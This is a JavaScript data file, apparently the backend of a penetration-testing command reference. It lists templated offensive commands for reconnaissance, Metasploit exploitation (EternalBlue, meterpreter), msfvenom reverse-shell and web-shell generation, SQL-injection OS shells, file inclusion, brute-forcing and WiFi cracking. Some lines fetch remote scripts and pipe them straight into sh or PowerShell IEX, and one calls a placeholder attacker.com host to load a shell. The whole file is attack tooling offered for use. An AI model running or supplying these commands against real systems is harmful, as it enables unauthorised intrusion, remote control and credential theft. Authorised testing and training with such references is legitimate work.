// Reconnaissance Tools Commands Database
const RECON_COMMANDS = {
    "Passive Reconnaissance": [
        {
            "id": 1,
            "name": "Whois Lookup",
            "command": "whois {domain}",
            "description": "Domain registration information lookup",
            "category": "OSINT"
        },
        {
            "id": 2,
            "name": "DNS Enumeration",
            "command": "dig {domain} ANY",
            "description": "DNS record enumeration",
            "category": "DNS"
        },
        {
            "id": 3,
            "name": "Reverse DNS Lookup",
            "command": "dig -x {ip}",
            "description": "Reverse DNS lookup for IP address",
            "category": "DNS"
        },
        {
            "id": 4,
            "name": "MX Record Lookup",
            "command": "dig {domain} MX",
            "description": "Mail exchange server lookup",
            "category": "DNS"
        },
        {
            "id": 5,
            "name": "NS Record Lookup",
            "command": "dig {domain} NS",
            "description": "Name server lookup",
            "category": "DNS"
        },
        {
            "id": 6,
            "name": "TXT Record Lookup",
            "command": "dig {domain} TXT",
            "description": "TXT record enumeration (SPF, DKIM, etc.)",
            "category": "DNS"
        },
        {
            "id": 7,
            "name": "Shodan IP Lookup",
            "command": "shodan host {ip}",
            "description": "Shodan database lookup for IP",
            "category": "OSINT"
        },
        {
            "id": 8,
            "name": "TheHarvester Email Enum",
            "command": "theharvester -d {domain} -l 500 -b google",
            "description": "Email and subdomain harvesting",
            "category": "OSINT"
        }
    ],
    "Active Reconnaissance": [
        {
            "id": 9,
            "name": "DNS Zone Transfer",
            "command": "dig axfr {domain} @{nameserver}",
            "description": "Attempt DNS zone transfer",
            "category": "DNS"
        },
        {
            "id": 10,
            "name": "DNS Brute Force",
            "command": "dnsrecon -d {domain} -D /usr/share/wordlists/dnsmap.txt -t brt",
            "description": "DNS subdomain brute force",
            "category": "DNS"
        },
        {
            "id": 11,
            "name": "Fierce DNS Scanner",
            "command": "fierce -dns {domain}",
            "description": "DNS reconnaissance and subdomain enumeration",
            "category": "DNS"
        },
        {
            "id": 12,
            "name": "DNSEnum Comprehensive",
            "command": "dnsenum {domain}",
            "description": "Comprehensive DNS enumeration",
            "category": "DNS"
        }
    ],
    "Network Reconnaissance": [
        {
            "id": 13,
            "name": "Masscan Port Scan",
            "command": "masscan -p1-65535 {ip}/24 --rate=1000",
            "description": "Fast mass port scanner",
            "category": "Port Scanning"
        },
        {
            "id": 14,
            "name": "Zmap Internet Scan",
            "command": "zmap -p 80 {ip}/24",
            "description": "Internet-wide port scanning",
            "category": "Port Scanning"
        },
        {
            "id": 15,
            "name": "Hping3 Ping Sweep",
            "command": "hping3 -1 {ip} -c 1",
            "description": "Custom packet ping with hping3",
            "category": "Discovery"
        },
        {
            "id": 16,
            "name": "Netdiscover ARP Scan",
            "command": "netdiscover -r {ip}/24",
            "description": "Active/passive ARP reconnaissance",
            "category": "Discovery"
        }
    ],
    "OSINT Tools": [
        {
            "id": 17,
            "name": "Maltego Investigation",
            "command": "# Use Maltego GUI for OSINT",
            "description": "Link analysis and data mining",
            "category": "OSINT"
        },
        {
            "id": 18,
            "name": "Recon-ng Framework",
            "command": "recon-ng",
            "description": "Full-featured reconnaissance framework",
            "category": "OSINT"
        },
        {
            "id": 19,
            "name": "SpiderFoot OSINT",
            "command": "spiderfoot -s {domain}",
            "description": "Automated OSINT reconnaissance",
            "category": "OSINT"
        },
        {
            "id": 20,
            "name": "Dmitry Information Gathering",
            "command": "dmitry -winse {domain}",
            "description": "Deepmagic information gathering tool",
            "category": "OSINT"
        }
    ]
};

// Exploitation Tools Commands Database  
const EXPLOITATION_COMMANDS = {
    "Metasploit Framework": [
        {
            "id": 1,
            "name": "Metasploit Console",
            "command": "msfconsole",
            "description": "Start Metasploit framework console",
            "category": "Framework"
        },
        {
            "id": 2,
            "name": "Search Exploits",
            "command": "search type:exploit platform:windows",
            "description": "Search for Windows exploits in MSF",
            "category": "Search"
        },
        {
            "id": 3,
            "name": "EternalBlue Exploit",
            "command": "use exploit/windows/smb/ms17_010_eternalblue",
            "description": "Use EternalBlue SMB exploit",
            "category": "SMB Exploit"
        },
        {
            "id": 4,
            "name": "Windows Meterpreter",
            "command": "set payload windows/x64/meterpreter/reverse_tcp",
            "description": "Set Windows Meterpreter reverse payload",
            "category": "Payload"
        },
        {
            "id": 5,
            "name": "Linux Meterpreter",
            "command": "set payload linux/x64/meterpreter/reverse_tcp",
            "description": "Set Linux Meterpreter reverse payload",
            "category": "Payload"
        },
        {
            "id": 6,
            "name": "Multi Handler",
            "command": "use exploit/multi/handler",
            "description": "Set up payload handler for incoming connections",
            "category": "Handler"
        }
    ],
    "Buffer Overflow": [
        {
            "id": 7,
            "name": "Pattern Create",
            "command": "msf-pattern_create -l 400",
            "description": "Create cyclic pattern for buffer overflow",
            "category": "Buffer Overflow"
        },
        {
            "id": 8,
            "name": "Pattern Offset",
            "command": "msf-pattern_offset -l 400 -q 42306142",
            "description": "Find offset in cyclic pattern",
            "category": "Buffer Overflow"
        },
        {
            "id": 9,
            "name": "Bad Characters",
            "command": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT=4444 -b '\\x00\\x0a\\x0d' -f c",
            "description": "Generate payload avoiding bad characters",
            "category": "Buffer Overflow"
        }
    ],
    "Payload Generation": [
        {
            "id": 10,
            "name": "Windows Reverse Shell",
            "command": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT=4444 -f exe > shell.exe",
            "description": "Generate Windows reverse shell executable",
            "category": "Payload"
        },
        {
            "id": 11,
            "name": "Linux Reverse Shell",
            "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT=4444 -f elf > shell.elf",
            "description": "Generate Linux reverse shell executable",
            "category": "Payload"
        },
        {
            "id": 12,
            "name": "PHP Web Shell",
            "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT=4444 -f raw > shell.php",
            "description": "Generate PHP reverse shell",
            "category": "Payload"
        },
        {
            "id": 13,
            "name": "JSP Web Shell",
            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT=4444 -f raw > shell.jsp",
            "description": "Generate JSP reverse shell",
            "category": "Payload"
        },
        {
            "id": 14,
            "name": "ASP Web Shell",
            "command": "msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT=4444 -f asp > shell.asp",
            "description": "Generate ASP reverse shell",
            "category": "Payload"
        },
        {
            "id": 15,
            "name": "Python Reverse Shell",
            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT=4444 -f raw",
            "description": "Generate Python reverse shell command",
            "category": "Payload"
        }
    ],
    "Web Exploitation": [
        {
            "id": 16,
            "name": "SQLMap OS Shell",
            "command": "sqlmap -u 'http://{ip}/page.php?id=1' --os-shell",
            "description": "Get OS shell through SQL injection",
            "category": "SQL Injection"
        },
        {
            "id": 17,
            "name": "Local File Inclusion",
            "command": "curl 'http://{ip}/page.php?file=../../../../etc/passwd'",
            "description": "Test for Local File Inclusion",
            "category": "LFI"
        },
        {
            "id": 18,
            "name": "Remote File Inclusion",
            "command": "curl 'http://{ip}/page.php?file=http://attacker.com/shell.txt'",
            "description": "Test for Remote File Inclusion",
            "category": "RFI"
        },
        {
            "id": 19,
            "name": "File Upload Bypass",
            "command": "curl -X POST -F 'file=@shell.php.gif' http://{ip}/upload.php",
            "description": "Attempt file upload filter bypass",
            "category": "File Upload"
        }
    ],
    "Privilege Escalation": [
        {
            "id": 20,
            "name": "LinPEAS Linux Enum",
            "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "description": "Linux privilege escalation enumeration",
            "category": "Linux PrivEsc"
        },
        {
            "id": 21,
            "name": "WinPEAS Windows Enum",
            "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"",
            "description": "Windows privilege escalation enumeration",
            "category": "Windows PrivEsc"
        },
        {
            "id": 22,
            "name": "GTFOBins SUID",
            "command": "find / -perm -u=s -type f 2>/dev/null",
            "description": "Find SUID binaries for privilege escalation",
            "category": "Linux PrivEsc"
        },
        {
            "id": 23,
            "name": "Windows Service Enum",
            "command": "sc query state= all",
            "description": "Enumerate Windows services",
            "category": "Windows PrivEsc"
        }
    ]
};

// Password Cracking Commands Database
const PASSWORD_COMMANDS = {
    "Hash Cracking": [
        {
            "id": 1,
            "name": "Hashcat MD5 Crack",
            "command": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
            "description": "Crack MD5 hashes with wordlist",
            "category": "Hash Cracking"
        },
        {
            "id": 2,
            "name": "Hashcat NTLM Crack",
            "command": "hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt",
            "description": "Crack NTLM hashes",
            "category": "Hash Cracking"
        },
        {
            "id": 3,
            "name": "John the Ripper",
            "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
            "description": "Crack hashes with John the Ripper",
            "category": "Hash Cracking"
        },
        {
            "id": 4,
            "name": "Hashcat SHA256",
            "command": "hashcat -m 1400 -a 0 sha256.txt /usr/share/wordlists/rockyou.txt",
            "description": "Crack SHA256 hashes",
            "category": "Hash Cracking"
        },
        {
            "id": 5,
            "name": "Hashcat Brute Force",
            "command": "hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d",
            "description": "Brute force MD5 with 8-digit mask",
            "category": "Hash Cracking"
        }
    ],
    "Network Authentication": [
        {
            "id": 6,
            "name": "Hydra SSH Brute Force",
            "command": "hydra -l {username} -P /usr/share/wordlists/rockyou.txt ssh://{ip}",
            "description": "SSH password brute force",
            "category": "Network Brute Force"
        },
        {
            "id": 7,
            "name": "Hydra FTP Brute Force",
            "command": "hydra -l {username} -P /usr/share/wordlists/rockyou.txt ftp://{ip}",
            "description": "FTP password brute force",
            "category": "Network Brute Force"
        },
        {
            "id": 8,
            "name": "Hydra HTTP Form",
            "command": "hydra -l {username} -P /usr/share/wordlists/rockyou.txt {ip} http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'",
            "description": "HTTP form brute force",
            "category": "Web Brute Force"
        },
        {
            "id": 9,
            "name": "Medusa SSH Attack",
            "command": "medusa -h {ip} -u {username} -P /usr/share/wordlists/rockyou.txt -M ssh",
            "description": "SSH brute force with Medusa",
            "category": "Network Brute Force"
        },
        {
            "id": 10,
            "name": "Ncrack Multiple Services",
            "command": "ncrack -vv --user {username} -P /usr/share/wordlists/rockyou.txt {ip}:22,{ip}:3389",
            "description": "Multi-service password cracking",
            "category": "Network Brute Force"
        }
    ],
    "WiFi Cracking": [
        {
            "id": 11,
            "name": "Aircrack-ng WPA/WPA2",
            "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} capture.cap",
            "description": "Crack WPA/WPA2 handshake",
            "category": "WiFi"
        },
        {
            "id": 12,
            "name": "Hashcat WPA2",
            "command": "hashcat -m 2500 -a 0 handshake.hccapx /usr/share/wordlists/rockyou.txt",
            "description": "Crack WPA2 with Hashcat",
            "category": "WiFi"
        },
        {
            "id": 13,
            "name": "Wifite Automated",
            "command": "wifite",
            "description": "Automated WiFi attack tool",
            "category": "WiFi"
        }
    ]
};